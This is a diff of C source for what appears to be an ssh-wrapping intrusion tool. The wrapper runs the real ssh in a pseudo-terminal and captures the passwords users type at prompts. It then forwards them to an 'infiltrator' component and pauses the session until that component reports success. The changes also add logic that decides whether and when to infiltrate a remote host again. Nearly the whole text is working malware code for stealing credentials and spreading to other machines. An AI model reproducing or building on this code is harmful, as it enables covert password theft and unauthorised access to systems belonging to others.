+	timeout_update(THC_TO_WAIT_CONNECT_SEC, THC_EXP_ACTION_FINISH);
 }
 
 // Real ssh has logged in
 static void
 set_state_real_ssh_logged_in(void)
 {
-	// DEBUGF("ENTER %s\n", __func__);
+	DEBUGF("ENTER %s\n", __func__);
 	g_is_logged_in = 1;
 	g_is_pty_pause = false;
 
@@ -1029,10 +1154,12 @@ set_state_password_captured(char *pwd)
 	{
 		// Send password
 		// DEBUGF("Sending password='%s\\n' to infiltrator.\n", pwd);
-		// write(fd_i, pwd, strlen(pwd));
 		IO_write(&io_i, pwd, strlen(pwd));
 
-		g_is_pty_pause = false;
+		// If this is the wrong password then ssh will take 2-3 seconds to reply with
+		// "Permission denied, please try again later". Wait for this or THCPROFILE
+		// g_is_pty_pause = false;  # Delay login until THCPROFILE is received
+		timeout_update(THC_TO_WAIT_PASSWORD_AUTH, THC_EXP_ACTION_UNPAUSE);
 		g_is_waiting_at_prompt_i = false;
 	} else {
 		g_is_pty_pause = true;
@@ -1049,6 +1176,7 @@ strstr_password(char *str)
 	if ((strstr(str, "passphrase") != NULL) || (strstr(str, "assword") != NULL))
 		return true;
 
+	// DEBUGF_C("false=%s\n", str);
 	return false;
 }
 
@@ -1083,12 +1211,20 @@ cb_lnbuf(void *lptr, void *arg_UNUSED)
 		if (password != NULL)
 		{
 			// Received password.
-			DEBUGF("PASSWORD CANDIDATE (%d/%d): '%s'\n", n_prompts, n_passwords, LNBUF_line(&g.ln_in));
-
 			n_passwords += 1;
+			DEBUGF_W("PASSWORD CANDIDATE (%d/%d): '%s' (g_is_pty_pause=%s)\n", n_prompts, n_passwords, LNBUF_line(&g.ln_in), g_is_pty_pause?"true":"false");
+
+			// Pause real ssh until next password prompt, timeout or THCPROFILE
+			g_is_pty_pause = true;
+			g_is_skip_line = true;
+			IO_pause(&io_ssh);
+
 			set_state_password_captured(password);
+			DEBUGF_C("g_is_pty_pause=%s\n", g_is_pty_pause?"true":"false");
 			output_after_password_count = 0;
 		}
+
+		return;
 	}
 
 	if (l == &g.ln_pty)
@@ -1098,8 +1234,9 @@ cb_lnbuf(void *lptr, void *arg_UNUSED)
 		// Do same Kama Sutra to determine if login was a success:
 		// - Check number ssh's output lines followed by entering password.
 		// - Logged in unless output line is 'Permission denied'.
-		if (strncmp(LNBUF_str(&g.ln_pty), "Permission denied", strlen("Permission denied")) == 0)
+		if (strstr(LNBUF_str(&g.ln_pty), "ermission denied") != NULL)
 		{
+			// user@127.0.0.1: Permission denied (publickey,password).
 			// Permit 1 error line
 			output_after_password_count = 0;
 		}
@@ -1113,12 +1250,16 @@ cb_lnbuf(void *lptr, void *arg_UNUSED)
 			// Permit 1 error line
 			output_after_password_count = 0;
 		}
+		if (strstr(LNBUF_str(&g.ln_pty), "authenticity") != NULL)
+			output_after_password_count = 0;
+		if (strstr(LNBUF_str(&g.ln_pty), "fingerprint") != NULL)
+			output_after_password_count = 0;
 
 		DEBUGF("R:  ssh='%s'\n", LNBUF_line(&g.ln_pty));
 		// First line we get is the actual 'Password' prompt (after hitting 'enter').
 		output_after_password_count += 1;
 		// If the 2nd line is _not_ a password prompt then assume we are logged in successfully.
-		if (output_after_password_count >= 2)
+		if (output_after_password_count >= 5)
 			set_state_real_ssh_logged_in();
 	}
 }
@@ -1129,14 +1270,36 @@ cb_lnbuf_infiltrate_ssh(void *lptr, void *arg_UNUSED)
 {
 	LNBUF *l = (LNBUF *)lptr;
 
+	DEBUGF("I: HOOK='%s' (stage=%d)\n", LNBUF_line(l), stage_i);
+
 	// Any full line means it can not be a password prompt (because 
 	// password prompts never end with '\n'
 	g_is_waiting_at_prompt_i = false;
 	g_is_prompt_waiting_newline_i = false;
 
-	match_stage_inside(LNBUF_str(l));
+	int ret;
+	ret = match_stage_inside(LNBUF_str(l));
+	if ((ret == false) && (stage_i < THC_STAGE_I_INSIDE))
+	{
+		// HERE: _NOT_ THCINSIDE
+
+		// Any output but THCINSIDE and we treat it as continue.
+		// Such output could be "Perission denied, please try again" but also
+		// THCPROFILE. In either case we need to continue real ssh.
+
+		if (g_is_skip_line == false)
+		{
+			// We only see the '%bob@127.0.0.1's password: ' here after we send the password
+			// to the infiltrator. Do not enable IO yet but wait for THCPROFILE
+			// or any other line such as 'Permission denied, please ..'.
+			IO_unpause(&io_ssh);
+			g_is_pty_pause = false;
+		} else {
+			// DEBUGF_Y("Skipping this line. NOT unpausing io_ssh\n");
+			g_is_skip_line = false;
+		}
+	}
 	match_stage_profile(LNBUF_str(l));
-	DEBUGF("I: HOOK='%s' (stage=%d)\n", LNBUF_line(l), stage_i);
 }
 
 // Start real SSH
@@ -1148,21 +1311,105 @@ pty_ssh_start(void)
 		return;
 	g_is_pty_ssh_start = true;
 
-	LNBUF_init(&g.ln_pty, 80, fd_pty, cb_lnbuf, &g.ln_pty);
-	LNBUF_init(&g.ln_in, 80, STDIN_FILENO, cb_lnbuf, &g.ln_in);
+	// Dont need the line buffer if infiltrator login was success (e.g. THCINSIDE)
+	// This can happen when not asked for a password at all (key-auth)
+	if (stage_i < THC_STAGE_I_INSIDE)
+	{
+		LNBUF_init(&g.ln_pty, 80, fd_pty, cb_lnbuf, &g.ln_pty);
+		LNBUF_init(&g.ln_in, 80, STDIN_FILENO, cb_lnbuf, &g.ln_in);
+	}
 
 	// Start original ssh in a PTY-harness
 	fd_pty = pty_cmd(&pid_ssh, g.target_file, g.target_name, g_argv);
+	DEBUGF("real pid=%d, fd_pty=%d\n", pid_ssh, fd_pty);
+	IO_init(&io_ssh, fd_pty, cb_io_ssh, NULL);
+	IO_init(&io_out, STDOUT_FILENO, NULL, NULL);
+
 	// Set STDIN to RAW (and become a pass-through PTY)
 	stty_set_passthrough(STDIN_FILENO, &g_tios_saved);
 	g_is_tios_saved = true;
 }
 
+
+static int
+db_update(const char *dbname)
+{
+	char buf[4096];
+	FILE *fp;
+	snprintf(buf, sizeof buf, "%s/db-%s-%s.%s", g.db_basedir, g.target_name, g_host_id, dbname);
+
+	fp = fopen(buf, "w");
+	if (fp == NULL)
+	{
+		DEBUGF_R("ERROR: fopen(%s): %s\n", buf, strerror(errno));
+		return -1;
+	}
+
+	fprintf(fp, "%ld\n", time(NULL));
+	fclose(fp);
+
+	return 0;
+}
+
+// Return TRUE if dbname is older than sec seconds.
+// Return FALSE on error
+static bool
+db_check_expired(const char *dbname, int sec)
+{
+	char buf[4096];
+	struct stat s;
+	long int now_sec;
+	bool ret;
+
+	now_sec = time(NULL);
+
+	// Check when we tried last. If we tried recently then dont try again.
+	snprintf(buf, sizeof buf, "%s/db-%s-%s.%s", g.db_basedir, g.target_name, g_host_id, dbname);
+	ret = stat(buf, &s);
+	// File does not exist. Thus we shall TRY to create it...
+	if (ret == 0)
+	{
+		if (s.st_mtime + sec >= now_sec)
+		{
+			DEBUGF_Y("SKIP %s. Tried %ld seconds ago. Expire in %ld sec\n", dbname, now_sec - s.st_mtime, s.st_mtime + sec - now_sec);
+			return false;
+		}
+	}
+
+	return true; // File does not exists or has expired.
+}
+
 static bool
 is_need_infiltrate(void)
 {
-	// FIXME: Check if we recently tried and failed or if this is already infiltrated.
-	return true;
+	bool ret;
+
+	if (g_is_ssh == true)
+	{
+
+		// Check when we tried last. If we tried recently then dont try again.
+		ret = db_check_expired("try", g_db_trysec);
+		if (ret == false)
+			return false;
+		if (db_update("try") != 0)
+			return false;
+
+		ret = db_check_expired("inf", g.recheck_time);
+		if (ret == false)
+			return false;
+
+		return true;
+	}
+
+	return false;
+}
+
+static void
+print_random()
+{
+	srandom(THC_usec());
+	printf("%ld\n", random());
+	exit(0);
 }
 
 int
@@ -1171,6 +1418,9 @@ main(int argc, char *argv[])
 	// During deployment we use this to check that this binary is executeable
 	if (getenv("THC_EXEC_TEST") != NULL)
 		exit(0);
+
+	if (getenv("THC_GET_RANDOM") != NULL)
+		print_random();
 
 	init_vars(&argc, &argv);
 
@@ -1228,6 +1478,11 @@ main(int argc, char *argv[])
 		if (WIFSIGNALED(wstatus))
 		{
 			DEBUGF("PID %d killed by signal %d\n", pid_ssh, WTERMSIG(wstatus));
+			// fd_log and fd_log_in might be identical if logging to same file.
+			if (g.fd_log != g.fd_log_in)
+				XCLOSE(g.fd_log_in);
+			else
+				g.fd_log_in = -1;
 			XCLOSE(g.fd_log);
 			kill(getpid(), WTERMSIG(wstatus));
 		}
